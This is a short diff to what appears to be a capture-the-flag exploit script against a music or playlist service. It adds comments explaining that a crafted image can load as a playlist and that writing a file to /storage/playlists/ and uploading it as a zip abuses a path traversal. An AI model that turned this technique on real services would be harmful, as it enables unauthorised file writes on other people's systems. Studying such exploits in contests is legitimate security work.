@@ -40,7 +40,7 @@ def create_track_fix(track_name, image_path, artist):
     mp3file.tag.save()
 
 
-def patch_image():
+def patch_image():  # <- image with a text inside can be loaded as a playlist
     with open("proto_image.png", mode="rb") as i:
         img = Image.open(i)
 
@@ -68,7 +68,7 @@ def create_playlist_file(path_for_playlist):
 
 async def run_sploit(target="127.0.0.1"):
     pl_id = "e915797d-fba2-4b51-aa46-30df6810b387"
-    create_playlist_file(f"/storage/playlists/{pl_id}.m3u")
+    create_playlist_file(f"/storage/playlists/{pl_id}.m3u") # <- path traversal
     async with Api(target) as api:
         await api.upload_playlist("sploit.zip")
         print(f"Uploaded sploit...")
